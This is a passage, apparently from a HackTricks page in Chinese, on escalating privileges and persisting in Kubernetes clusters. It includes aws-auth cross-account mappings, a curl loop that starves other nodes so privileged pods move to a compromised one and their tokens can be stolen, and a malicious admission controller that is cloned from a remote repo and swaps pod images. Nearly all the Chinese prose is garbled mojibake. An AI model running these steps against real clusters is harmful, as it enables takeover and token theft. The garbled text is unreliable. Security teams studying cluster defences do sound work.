## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
æ‚¨å¯ä»¥ä½¿ç”¨ **`aws-auth`** è¿›è¡Œ **æŒä¹…æ€§**ï¼Œä»è€Œä½¿ç”¨æˆ·å¯ä»¥ä» **å…¶ä»–è´¦æˆ·** è®¿é—®ã€‚

ä½†æ˜¯ï¼Œ`aws --profile other_account eks update-kubeconfig --name <cluster-name>` **æ— æ³•ä»ä¸åŒçš„è´¦æˆ·** è¿è¡Œã€‚ä½†å®é™…ä¸Šï¼Œå¦‚æœæ‚¨å°†é›†ç¾¤çš„ ARN æ”¾åœ¨é‚£é‡Œï¼Œ`aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` å°±å¯ä»¥è¿è¡Œã€‚\
è¦ä½¿ `kubectl` å·¥ä½œï¼Œåªéœ€ç¡®ä¿ **é…ç½®å—å®³è€…çš„ kubeconfig**ï¼Œå¹¶åœ¨ aws exec args ä¸­æ·»åŠ  `--profile other_account_role`ï¼Œè¿™æ · kubectl å°†ä½¿ç”¨å…¶ä»–è´¦æˆ·é…ç½®æ–‡ä»¶æ¥è·å–ä»¤ç‰Œå¹¶è”ç³» AWSã€‚
{% endhint %}

### åœ¨ GKE ä¸­å‡çº§

æœ‰ **2 ç§æ–¹å¼å°† K8s æƒé™åˆ†é…ç»™ GCP ä¸»ä½“**ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œä¸»ä½“è¿˜éœ€è¦æƒé™ **`container.clusters.get`** æ¥æ”¶é›†å‡­æ®ä»¥è®¿é—®é›†ç¾¤ï¼Œå¦åˆ™æ‚¨å°†éœ€è¦ **ç”Ÿæˆè‡ªå·±çš„ kubectl é…ç½®æ–‡ä»¶**ï¼ˆè¯·å‚é˜…ä¸‹ä¸€ä¸ªé“¾æ¥ï¼‰ã€‚

{% hint style="warning" %}
å½“ä¸ K8s api ç«¯ç‚¹é€šä¿¡æ—¶ï¼Œå°†å‘é€ **GCP auth ä»¤ç‰Œ**ã€‚ç„¶åï¼Œé€šè¿‡ K8s api ç«¯ç‚¹ï¼ŒGCP é¦–å…ˆå°†æ£€æŸ¥ä¸»ä½“ï¼ˆé€šè¿‡ç”µå­é‚®ä»¶ï¼‰æ˜¯å¦åœ¨é›†ç¾¤å†…å…·æœ‰ä»»ä½•è®¿é—®æƒé™ï¼Œç„¶åå†æ£€æŸ¥æ˜¯å¦é€šè¿‡ GCP IAM å…·æœ‰ä»»ä½•è®¿é—®æƒé™ã€‚\
å¦‚æœå…¶ä¸­ **ä»»ä½•ä¸€ä¸ª** ä¸º **true**ï¼Œåˆ™ä¼š **å“åº”**ã€‚å¦‚æœ **ä¸æ˜¯**ï¼Œåˆ™ä¼šç»™å‡ºä¸€ä¸ªå»ºè®®é€šè¿‡ GCP IAM æˆäºˆæƒé™çš„ **é”™è¯¯**ã€‚
{% endhint %}

ç„¶åï¼Œç¬¬ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ **GCP IAM**ï¼ŒK8s æƒé™å…·æœ‰å…¶ **ç­‰æ•ˆçš„ GCP IAM æƒé™**ï¼Œå¦‚æœä¸»ä½“å…·æœ‰å®ƒï¼Œå®ƒå°†èƒ½å¤Ÿä½¿ç”¨å®ƒã€‚

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

ç¬¬äºŒç§æ–¹æ³•æ˜¯å°† K8s æƒé™åˆ†é…ç»™é›†ç¾¤å†…çš„ç”¨æˆ·ï¼Œé€šè¿‡å…¶ **ç”µå­é‚®ä»¶** è¿›è¡Œæ ‡è¯†ï¼ˆåŒ…æ‹¬ GCP æœåŠ¡å¸æˆ·ï¼‰ã€‚

### åˆ›å»º serviceaccounts ä»¤ç‰Œ

å¯ä»¥ **åˆ›å»º TokenRequests** (`serviceaccounts/token`) çš„ä¸»ä½“ï¼ˆæ¥è‡ª[**æ­¤å¤„**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)çš„ä¿¡æ¯ï¼‰ã€‚

### ephemeralcontainers

å¯ä»¥ **`update`** æˆ– **`patch`** **`pods/ephemeralcontainers`** çš„ä¸»ä½“å¯ä»¥åœ¨å…¶ä»– pod ä¸Šè·å¾— **ä»£ç æ‰§è¡Œæƒé™**ï¼Œå¹¶ä¸”å¯èƒ½é€šè¿‡æ·»åŠ å…·æœ‰ç‰¹æƒ securityContext çš„ä¸´æ—¶å®¹å™¨æ¥ **çªç ´** åˆ°å…¶èŠ‚ç‚¹ã€‚

### ValidatingWebhookConfigurations æˆ– MutatingWebhookConfigurations

å…·æœ‰ `validatingwebhookconfigurations` æˆ– `mutatingwebhookconfigurations` ä¸Šçš„ `create`ã€`update` æˆ– `patch` ä¸­çš„ä»»ä½•åŠ¨è¯çš„ä¸»ä½“å¯èƒ½èƒ½å¤Ÿ **åˆ›å»ºæ­¤ç±» webhookconfigurations** ä»¥ä¾¿èƒ½å¤Ÿ **å‡çº§æƒé™**ã€‚

æœ‰å…³ [`mutatingwebhookconfigurations` ç¤ºä¾‹ï¼Œè¯·æŸ¥çœ‹æ­¤æ–‡ç« çš„æ­¤éƒ¨åˆ†](./#malicious-admission-controller)ã€‚

### å‡çº§

å¦‚æ‚¨å¯ä»¥åœ¨ä¸‹ä¸€èŠ‚ä¸­é˜…è¯»çš„å†…å®¹ï¼š[**å†…ç½®ç‰¹æƒå‡çº§é¢„é˜²**](./#built-in-privileged-escalation-prevention)ï¼Œä¸»ä½“ä¸èƒ½æ›´æ–°æˆ–åˆ›å»ºè§’è‰²æˆ–é›†ç¾¤è§’è‰²ï¼Œé™¤éä»–è‡ªå·±å…·æœ‰è¿™äº›æ–°æƒé™ã€‚é™¤éä»–åœ¨ **`roles`** æˆ– **`clusterroles`** ä¸Šå…·æœ‰ **`escalate`** åŠ¨è¯ã€‚\
ç„¶åï¼Œä»–å¯ä»¥æ›´æ–°/åˆ›å»ºå…·æœ‰æ¯”ä»–æ‹¥æœ‰çš„æ›´å¥½æƒé™çš„æ–°è§’è‰²ã€é›†ç¾¤è§’è‰²ã€‚

### èŠ‚ç‚¹ä»£ç†

å…·æœ‰è®¿é—® **`nodes/proxy`** å­èµ„æºçš„ä¸»ä½“å¯ä»¥é€šè¿‡ Kubelet API åœ¨ pod ä¸Šæ‰§è¡Œä»£ç ï¼ˆæ ¹æ®[**æ­¤å¤„**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)ï¼‰ã€‚æœ‰å…³ Kubelet è®¤è¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ­¤é¡µé¢ï¼š

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å¦‚ä½•åœ¨ [**æˆæƒè®¿é—® Kubelet API æ—¶è·å¾— RCE çš„ç¤ºä¾‹**](../pentesting-kubernetes-services/#kubelet-rce)ã€‚

### åˆ é™¤ pods + æ— æ³•è°ƒåº¦çš„èŠ‚ç‚¹

å¯ä»¥ **åˆ é™¤ pods**ï¼ˆå¯¹ `pods` èµ„æºçš„ `delete` åŠ¨è¯ï¼‰ã€æˆ– **é©±é€ pods**ï¼ˆå¯¹ `pods/eviction` èµ„æºçš„ `create` åŠ¨è¯ï¼‰ã€æˆ– **æ›´æ”¹ pod çŠ¶æ€**ï¼ˆè®¿é—® `pods/status`ï¼‰å¹¶ä¸”å¯ä»¥ä½¿å…¶ä»–èŠ‚ç‚¹æ— æ³•è°ƒåº¦ï¼ˆè®¿é—® `nodes/status`ï¼‰æˆ– **åˆ é™¤èŠ‚ç‚¹**ï¼ˆå¯¹ `nodes` èµ„æºçš„ `delete` åŠ¨è¯ï¼‰å¹¶ä¸”å¯¹ä¸€ä¸ª pod æœ‰æ§åˆ¶æƒçš„ä¸»ä½“ï¼Œå¯ä»¥ä»å…¶ä»–èŠ‚ç‚¹ **çªƒå– pods**ï¼Œä½¿å®ƒä»¬åœ¨ **å—æŸçš„èŠ‚ç‚¹** ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”æ”»å‡»è€…å¯ä»¥ä»è¿™äº› pods ä¸­ **çªƒå–ä»¤ç‰Œ**ã€‚
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### æœåŠ¡çŠ¶æ€ï¼ˆCVE-2020-8554ï¼‰

å¯ä»¥**ä¿®æ”¹** **`services/status`** çš„ä¸»ä½“å¯èƒ½ä¼šå°†`status.loadBalancer.ingress.ip`å­—æ®µè®¾ç½®ä¸ºåˆ©ç”¨**æœªä¿®å¤çš„CVE-2020-8554**å¹¶å‘èµ·**å¯¹é›†ç¾¤çš„ä¸­é—´äººæ”»å‡»**ã€‚å¯¹äºCVE-2020-8554çš„å¤§å¤šæ•°ç¼“è§£æªæ–½ä»…é˜²æ­¢å¤–éƒ¨IPæœåŠ¡ï¼ˆæ ¹æ®[**æ­¤å¤„**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)ï¼‰ã€‚

### èŠ‚ç‚¹å’ŒPodçŠ¶æ€

å…·æœ‰å¯¹`nodes/status`æˆ–`pods/status`çš„**`update`**æˆ–**`patch`**æƒé™çš„ä¸»ä½“å¯èƒ½ä¼šä¿®æ”¹æ ‡ç­¾ä»¥å½±å“æ‰§è¡Œçš„è°ƒåº¦çº¦æŸã€‚

## å†…ç½®ç‰¹æƒå‡çº§é¢„é˜²

Kuberneteså…·æœ‰[å†…ç½®æœºåˆ¶](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)æ¥é˜²æ­¢ç‰¹æƒå‡çº§ã€‚

è¯¥ç³»ç»Ÿç¡®ä¿**ç”¨æˆ·æ— æ³•é€šè¿‡ä¿®æ”¹è§’è‰²æˆ–è§’è‰²ç»‘å®šæ¥æå‡å…¶ç‰¹æƒ**ã€‚å³ä½¿RBACæˆæƒå™¨å¤„äºéæ´»åŠ¨çŠ¶æ€ï¼Œæ­¤è§„åˆ™çš„æ‰§è¡Œå‘ç”Ÿåœ¨APIçº§åˆ«ï¼Œæä¾›äº†ä¸€ç§ä¿éšœã€‚

è¯¥è§„åˆ™è§„å®šï¼Œ**ç”¨æˆ·åªèƒ½åœ¨æ‹¥æœ‰è§’è‰²åŒ…å«çš„æ‰€æœ‰æƒé™çš„æƒ…å†µä¸‹åˆ›å»ºæˆ–æ›´æ–°è§’è‰²**ã€‚æ­¤å¤–ï¼Œç”¨æˆ·ç°æœ‰æƒé™çš„èŒƒå›´å¿…é¡»ä¸å…¶è¯•å›¾åˆ›å»ºæˆ–ä¿®æ”¹çš„è§’è‰²çš„èŒƒå›´ç›¸åŒ¹é…ï¼šå¯¹äºClusterRolesï¼Œè¦ä¹ˆæ˜¯æ•´ä¸ªé›†ç¾¤èŒƒå›´ï¼Œè¦ä¹ˆæ˜¯ç›¸åŒå‘½åç©ºé—´ï¼ˆæˆ–æ•´ä¸ªé›†ç¾¤èŒƒå›´ï¼‰ã€‚

{% hint style="warning" %}
å¯¹äºä¸Šè¿°è§„åˆ™æœ‰ä¸€ä¸ªä¾‹å¤–ã€‚å¦‚æœä¸€ä¸ªä¸»ä½“å¯¹**`roles`**æˆ–**`clusterroles`**å…·æœ‰**`escalate`**åŠ¨è¯ï¼Œä»–å¯ä»¥å¢åŠ è§’è‰²å’Œé›†ç¾¤è§’è‰²çš„ç‰¹æƒï¼Œå³ä½¿ä»–è‡ªå·±æ²¡æœ‰æƒé™ã€‚
{% endhint %}

### **è·å–å’Œä¿®æ”¹RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**æ˜¾ç„¶ï¼Œè¿™ç§æŠ€æœ¯ä»¥å‰æœ‰æ•ˆï¼Œä½†æ ¹æ®æˆ‘çš„æµ‹è¯•ï¼Œç”±äºå‰ä¸€éƒ¨åˆ†è§£é‡Šçš„ç›¸åŒåŸå› ï¼Œå®ƒç°åœ¨ä¸å†æœ‰æ•ˆã€‚å¦‚æœä½ æ²¡æœ‰æƒé™ï¼Œä½ ä¸èƒ½åˆ›å»º/ä¿®æ”¹ä¸€ä¸ªrolebindingæ¥ç»™è‡ªå·±æˆ–ä¸åŒçš„SAä¸€äº›ç‰¹æƒã€‚**
{% endhint %}

åˆ›å»ºRolebindingsçš„ç‰¹æƒå…è®¸ç”¨æˆ·**å°†è§’è‰²ç»‘å®šåˆ°æœåŠ¡è´¦æˆ·**ã€‚è¿™ç§ç‰¹æƒå¯èƒ½å¯¼è‡´ç‰¹æƒå‡çº§ï¼Œå› ä¸ºå®ƒ**å…è®¸ç”¨æˆ·å°†ç®¡ç†å‘˜ç‰¹æƒç»‘å®šåˆ°ä¸€ä¸ªå—æŸçš„æœåŠ¡è´¦æˆ·**ã€‚

## å…¶ä»–æ”»å‡»

### Sidecarä»£ç†åº”ç”¨

é»˜è®¤æƒ…å†µä¸‹ï¼ŒPodä¹‹é—´çš„é€šä¿¡ä¸­æ²¡æœ‰ä»»ä½•åŠ å¯†ã€‚åŒå‘ï¼ŒPodåˆ°Podçš„ç›¸äº’è®¤è¯ã€‚

#### åˆ›å»ºä¸€ä¸ªSidecarä»£ç†åº”ç”¨ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

åˆ›å»ºä½ çš„ .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
ç¼–è¾‘æ‚¨çš„ .yaml æ–‡ä»¶å¹¶æ·»åŠ å–æ¶ˆæ³¨é‡Šçš„è¡Œï¼š
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
æŸ¥çœ‹ä»£ç†çš„æ—¥å¿—ï¼š
```bash
kubectl logs app -C proxy
```
æ›´å¤šä¿¡æ¯è¯·è®¿é—®ï¼š[https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### æ¶æ„å‡†å…¥æ§åˆ¶å™¨

ä¸€ä¸ªå‡†å…¥æ§åˆ¶å™¨åœ¨å¯¹è±¡æŒä¹…åŒ–ä¹‹å‰**æ‹¦æˆªå¯¹ Kubernetes API æœåŠ¡å™¨çš„è¯·æ±‚**ï¼Œä½†åœ¨è¯·æ±‚ç»è¿‡**è®¤è¯**å’Œ**æˆæƒ**ä¹‹åã€‚

å¦‚æœæ”»å‡»è€…ä»¥æŸç§æ–¹å¼è®¾æ³•**æ³¨å…¥ä¸€ä¸ªå˜å¼‚å‡†å…¥æ§åˆ¶å™¨**ï¼Œä»–å°†èƒ½å¤Ÿ**ä¿®æ”¹å·²ç»ç»è¿‡è®¤è¯çš„è¯·æ±‚**ã€‚è¿™å¯èƒ½å¯¼è‡´æƒé™æå‡ï¼Œæ›´å¸¸è§çš„æ˜¯åœ¨é›†ç¾¤ä¸­æŒä¹…å­˜åœ¨ã€‚

**ç¤ºä¾‹æ¥è‡ª** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
æ£€æŸ¥çŠ¶æ€ä»¥æŸ¥çœ‹æ˜¯å¦å‡†å¤‡å°±ç»ªï¼š
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ç„¶åéƒ¨ç½²ä¸€ä¸ªæ–°çš„ Podï¼š
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
å½“æ‚¨çœ‹åˆ° `ErrImagePull` é”™è¯¯æ—¶ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹ä»»ä¸€æŸ¥è¯¢æ£€æŸ¥é•œåƒåç§°ï¼š
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

æ­£å¦‚æ‚¨åœ¨ä¸Šé¢çš„å›¾ç‰‡ä¸­æ‰€çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬å°è¯•è¿è¡Œé•œåƒ `nginx`ï¼Œä½†æœ€ç»ˆæ‰§è¡Œçš„é•œåƒæ˜¯ `rewanthtammana/malicious-image`ã€‚åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼ï¼ï¼Ÿ

#### æŠ€æœ¯ç»†èŠ‚ <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` è„šæœ¬å»ºç«‹äº†ä¸€ä¸ªå˜å¼‚çš„ Webhook å‡†å…¥æ§åˆ¶å™¨ï¼Œæ ¹æ®å…¶é…ç½®è¡Œä¿®æ”¹å¯¹ Kubernetes API çš„è¯·æ±‚ï¼Œå½±å“æ‰€è§‚å¯Ÿåˆ°çš„ç»“æœï¼š
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## æœ€ä½³å®è·µ

### **ç¦ç”¨æœåŠ¡è´¦æˆ·ä»¤ç‰Œçš„è‡ªåŠ¨æŒ‚è½½**

* **Pods å’ŒæœåŠ¡è´¦æˆ·**: é»˜è®¤æƒ…å†µä¸‹ï¼ŒPods ä¼šæŒ‚è½½ä¸€ä¸ªæœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚ä¸ºäº†å¢å¼ºå®‰å…¨æ€§ï¼ŒKubernetes å…è®¸ç¦ç”¨è¿™ä¸ªè‡ªåŠ¨æŒ‚è½½åŠŸèƒ½ã€‚
* **åº”ç”¨æ–¹æ³•**: ä» Kubernetes ç‰ˆæœ¬ 1.6 å¼€å§‹ï¼Œåœ¨æœåŠ¡è´¦æˆ·æˆ– Pods çš„é…ç½®ä¸­è®¾ç½® `automountServiceAccountToken: false`ã€‚

### **åœ¨ RoleBindings/ClusterRoleBindings ä¸­é™åˆ¶ç”¨æˆ·åˆ†é…**

* **é€‰æ‹©æ€§åŒ…å«**: ç¡®ä¿åªåŒ…å«å¿…è¦çš„ç”¨æˆ·åœ¨ RoleBindings æˆ– ClusterRoleBindings ä¸­ã€‚å®šæœŸå®¡è®¡å¹¶ç§»é™¤ä¸ç›¸å…³çš„ç”¨æˆ·ä»¥ä¿æŒä¸¥æ ¼çš„å®‰å…¨æ€§ã€‚

### **å‘½åç©ºé—´ç‰¹å®šè§’è‰²ä¼˜äºæ•´ä¸ªé›†ç¾¤èŒƒå›´çš„è§’è‰²**

* **Roles vs. ClusterRoles**: æ›´å€¾å‘äºåœ¨å‘½åç©ºé—´ç‰¹å®šæƒé™æ–¹é¢ä½¿ç”¨ Roles å’Œ RoleBindingsï¼Œè€Œä¸æ˜¯åº”ç”¨äºæ•´ä¸ªé›†ç¾¤çš„ ClusterRoles å’Œ ClusterRoleBindingsã€‚è¿™ç§æ–¹æ³•æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶ï¼Œå¹¶é™åˆ¶äº†æƒé™çš„èŒƒå›´ã€‚

### **ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **å‚è€ƒèµ„æ–™**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„ **å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
